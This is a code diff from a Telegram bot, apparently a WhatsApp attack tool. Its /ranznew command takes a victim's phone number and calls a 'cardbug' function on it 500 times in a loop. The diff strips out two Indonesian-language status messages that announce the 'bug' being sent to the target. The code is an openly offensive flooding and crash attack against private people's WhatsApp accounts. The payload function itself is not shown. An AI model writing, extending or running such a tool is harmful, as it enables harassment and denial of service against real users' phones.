@@ -4975,14 +4975,6 @@ bot.onText(/\/ranznew(?:\s(.+))?/, async (msg, match) => {
     const formatedNumber = numberTarget + "@s.whatsapp.net";
 
     // Kirim notifikasi awal dengan gambar
-    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
-        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
-┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
-┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
-┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
-    });
-
     for (let i = 0; i < 500; i++) { // Kirim 3 kali langsung
         await cardbug(formatedNumber);
         await new Promise((resolve) => setTimeout(resolve, 3000));
@@ -4990,17 +4982,6 @@ bot.onText(/\/ranznew(?:\s(.+))?/, async (msg, match) => {
         await new Promise((resolve) => setTimeout(resolve, 3000));
         console.log(chalk.red("Send Bug Succes"))
     }
-
-    // Kirim notifikasi setelah selesai dengan gambar lain
-    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
-        caption: `
-┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
-┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
-┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /delay
-┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
-    });
 });
 bot.onText(/\/ranzcombo(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
